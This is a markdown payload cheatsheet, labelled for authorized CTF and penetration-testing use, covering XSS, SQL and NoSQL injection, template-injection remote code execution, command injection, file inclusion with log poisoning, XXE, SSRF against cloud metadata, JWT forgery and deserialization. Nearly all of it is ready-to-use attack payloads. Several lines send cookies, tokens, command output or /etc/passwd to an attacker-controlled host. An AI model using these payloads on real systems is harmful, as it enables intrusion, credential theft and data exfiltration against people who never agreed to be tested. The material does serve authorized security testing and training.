# Common Payloads Cheatsheet

> For authorized CTF / penetration-testing / educational use ONLY.
> Only run these against targets you own or have explicit written permission to test.

Placeholders: `$LHOST` = your IP, `$LPORT` = your port, `$URL` = target URL.

---

## 1. XSS (Cross-Site Scripting)

### Basic
```html
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

### Cookie / data exfiltration
```html
<script>fetch('http://$LHOST/?c='+document.cookie)</script>
<img src=x onerror="this.src='http://$LHOST/?c='+document.cookie">
<script>new Image().src='http://$LHOST/?'+localStorage.getItem('token')</script>
```

### Polyglot (works in many contexts)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarea/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Filter bypasses
```html
<ScRiPt>alert(1)</sCrIpT>                      <!-- case -->
<scr<script>ipt>alert(1)</scr</script>ipt>     <!-- nested/strip -->
<svg><script>alert&#40;1&#41;</script>          <!-- HTML entity -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>  <!-- base64 alert(1) -->
<a href="&#106;avascript:alert(1)">x</a>        <!-- entity-encoded scheme -->
<body onload=alert(1)>  <details open ontoggle=alert(1)>  <!-- alt event handlers -->
```

---

## 2. SQL Injection

### Authentication bypass
```sql
' OR '1'='1
' OR '1'='1'-- -
admin'-- -
admin'#
') OR ('1'='1
' OR 1=1 LIMIT 1-- -
" OR ""="
' OR '1'='1' /*
```

### UNION-based
```sql
' ORDER BY 5-- -                          -- find column count (increment to error)
' UNION SELECT NULL,NULL,NULL-- -          -- match column count
' UNION SELECT 1,2,3-- -                   -- find reflected columns
' UNION SELECT 1,@@version,3-- -           -- MySQL/MSSQL version
' UNION SELECT 1,database(),3-- -          -- current DB (MySQL)
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273-- -  -- 'users' as hex
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### Error-based (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### Blind (boolean / time)
```sql
' AND 1=1-- -            (true)        ' AND 1=2-- -   (false)
' AND SUBSTRING(database(),1,1)='a'-- -
' AND (SELECT SLEEP(5))-- -                        -- MySQL time-based
' AND IF(1=1,SLEEP(5),0)-- -
'; WAITFOR DELAY '0:0:5'-- -                        -- MSSQL time-based
' AND (SELECT pg_sleep(5))-- -                      -- PostgreSQL
```

### Per-DB notes / read files
| DB | version | comment | concat | read file |
|---|---|---|---|---|
| MySQL | `@@version` | `-- -`, `#`, `/**/` | `concat()` | `LOAD_FILE('/etc/passwd')` |
| MSSQL | `@@version` | `--` | `+` | `OPENROWSET` / `xp_cmdshell` |
| PostgreSQL | `version()` | `--` | `\|\|` | `pg_read_file('/etc/passwd')` |
| Oracle | `SELECT banner FROM v$version` | `--` | `\|\|` | use `FROM dual` |
| SQLite | `sqlite_version()` | `--` | `\|\|` | `sqlite_master` table list |

---

## 3. SSTI (Server-Side Template Injection)

Detection: `${{<%[%'"}}%\` and arithmetic probes:
- `{{7*7}}` → `49` = Jinja2/Twig | `${7*7}` → `49` = Freemarker/Spring | `#{7*7}` = Ruby/Thymeleaf
- `{{7*'7'}}` → `7777777` = **Jinja2**, → `49` = **Twig**

### Jinja2 / Flask (Python) — RCE
```python
{{7*7}}
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
```

### Twig (PHP) — RCE
```php
{{7*7}}
{{['id']|filter('system')}}
{{['id',""]|sort('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```java
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### Smarty (PHP)
```php
{php}echo `id`;{/php}
{system('id')}
```

### ERB (Ruby)
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```
Automation: `python3 tplmap.py -u "$URL?inj=*"`

---

## 4. Command Injection

### Separators
```bash
; id            # run after
| id            # pipe
|| id           # run if first fails
& id            # background
&& id           # run if first succeeds
`id`            # backtick substitution
$(id)           # command substitution
%0a id          # newline (URL-encoded)
%0d%0a id       # CRLF
'; id; '        # break out of single quotes
" ; id ; "      # break out of double quotes
```

### Bypasses (filtered chars)
```bash
# Spaces filtered -> use ${IFS} or tabs or brace expansion:
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat$IFS$9/etc/passwd
# Keyword filtering -> break it up:
c''at /etc/passwd     c\at /etc/passwd     who$@ami
/???/c?t /etc/passwd  # wildcards
# Blind exfil:
; curl http://$LHOST/$(id|base64)
; ping -c1 $LHOST
; nslookup $(whoami).$LHOST
# Base64 the command:
echo aWQ=|base64 -d|bash
```

---

## 5. LFI / Path Traversal + LFI-to-RCE

### Basic traversal + encodings
```
../../../../etc/passwd
....//....//....//etc/passwd                 (filter strips one "../")
..%2f..%2f..%2fetc%2fpasswd                  (URL-encoded)
..%252f..%252fetc%252fpasswd                 (double URL-encoded)
%2e%2e%2f%2e%2e%2fetc/passwd
..%c0%af..%c0%afetc/passwd                   (overlong UTF-8)
/etc/passwd%00                               (null byte, legacy PHP)
....\\....\\windows\win.ini                  (Windows)
```

### PHP wrappers
```
php://filter/convert.base64-encode/resource=index.php      # exfil source code
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # data:// -> system($_GET['c'])
expect://id                                                 # if expect module loaded -> RCE
php://input  (+ POST body: <?php system('id'); ?>)
phar://archive.phar/file
zip://archive.zip%23file
```

### LFI -> RCE techniques
```
# 1. Log poisoning: inject PHP into a log, then include it
curl http://$IP/ -A "<?php system(\$_GET['c']); ?>"        # poison User-Agent into access.log
http://$IP/?file=/var/log/apache2/access.log&c=id
# Other poisonable logs: /var/log/auth.log (via ssh user=<?php...?>), /var/log/vsftpd.log,
#   /var/log/mail, /proc/self/environ (via User-Agent)
# 2. /proc tricks
http://$IP/?file=/proc/self/environ
http://$IP/?file=/proc/self/fd/0
# 3. PHP session poisoning: write payload into PHPSESSID value, include /var/lib/php/sessions/sess_<id>
# 4. Mail: send mail to user, include /var/mail/<user>
```

---

## 6. XXE (XML External Entity)

### File read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><x>&xxe;</x></root>
```

### File read of PHP/binary (base64 via wrapper)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

### Out-of-band (OOB) / blind exfil
```xml
<!-- payload sent to target -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://$LHOST/evil.dtd"> %xxe;]>
<root>x</root>
<!-- evil.dtd hosted on your box -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://$LHOST/?d=%file;'>">
%eval; %exfil;
```

---

## 7. SSRF + Cloud Metadata

### Basic SSRF
```
http://127.0.0.1:80/      http://localhost/admin
http://internal-service:8080/
file:///etc/passwd        gopher://127.0.0.1:6379/_...   (redis/db via gopher)
dict://127.0.0.1:6379/info
```

### Localhost / filter bypasses
```
http://127.0.0.1        http://0.0.0.0       http://[::1]      http://[::]
http://2130706433       (decimal of 127.0.0.1)
http://0177.0.0.1       (octal)              http://0x7f.0.0.1 (hex)
http://127.1            http://localtest.me  (DNS->127.0.0.1)
http://127.0.0.1.nip.io
http://target.com@127.0.0.1     http://127.0.0.1#@target.com   (parser confusion)
```

### Cloud metadata endpoints
```
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://169.254.169.254/latest/user-data/
# GCP (requires header)  Metadata-Flavor: Google
http://169.254.169.254/computeMetadata/v1/instance/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Azure  (requires header)  Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# DigitalOcean / Alibaba / Oracle also use 169.254.169.254
```

---

## 8. JWT (JSON Web Token) Attacks

```
Structure: header.payload.signature   (each base64url-encoded JSON)
```
```bash
# Decode
echo "$JWT" | cut -d. -f1 | base64 -d ; echo "$JWT" | cut -d. -f2 | base64 -d
```
### none algorithm
Set header to `{"alg":"none","typ":"JWT"}`, modify payload (e.g. `"role":"admin"`),
leave signature EMPTY (token ends with a trailing dot). Also try `None`, `NONE`, `nOnE`.

### Weak HMAC secret (crack it)
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --format=HMAC-SHA256 --wordlist=rockyou.txt
# then re-sign with the cracked secret
```

### alg confusion (RS256 -> HS256)
Server verifies RS256 with public key. Switch header `alg` to `HS256` and sign the token
using the server's **public key bytes as the HMAC secret** — server validates it as symmetric.

### Tooling
```bash
python3 jwt_tool.py $JWT                        # inspect
python3 jwt_tool.py $JWT -X a                    # alg:none exploit
python3 jwt_tool.py $JWT -C -d rockyou.txt       # crack secret
python3 jwt_tool.py $JWT -S hs256 -k public.pem  # alg confusion
```

---

## 9. NoSQL Injection (MongoDB etc.)

### Auth bypass (JSON body)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": "x"}}
```
### URL-encoded form params
```
username[$ne]=x&password[$ne]=x
username[$regex]=admin&password[$ne]=x
```
### JS injection / operators
```
'; return true; var x='        (where $where is used)
{"$where": "sleep(5000)"}       (blind time-based)
```
Tool: `python3 nosqlmap.py` or `python3 nosqli.py`.

---

## 10. Deserialization (pointers)

- **Java**: look for magic bytes `AC ED 00 05` (raw) or `rO0AB` (base64). Generate gadget chains with **ysoserial**: `java -jar ysoserial.jar CommonsCollections5 'curl http://$LHOST/' | base64`.
- **PHP**: serialized objects start `O:` — exploit `__wakeup`/`__destruct` magic methods (POP chains). Tool: **phpggc** (`phpggc Monolog/RCE1 system id`).
- **Python**: `pickle.loads` of attacker data → RCE via `__reduce__`.
  ```python
  import pickle,os,base64
  class P:
      def __reduce__(self): return (os.system,("id",))
  print(base64.b64encode(pickle.dumps(P())))
  ```
- **.NET**: `BinaryFormatter`/`ViewState` — use **ysoserial.net**.
- **Node.js**: `node-serialize` with `_$$ND_FUNC$$_` IIFE payload.

---

## 11. Quick Encoding Helpers

```bash
# URL-encode a payload
python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" '; id'
# Base64
echo -n 'payload' | base64        ;        base64 -d <<< 'cGF5bG9hZA=='
# Hex (for SQL string bypass, e.g. 0x7573657273 = 'users')
python3 -c "print('0x'+'users'.encode().hex())"
```

See also: `reverse-shells.md`, `ctf-master-cheatsheet.md`.
PayloadsAllTheThings (online): https://github.com/swisskyrepo/PayloadsAllTheThings
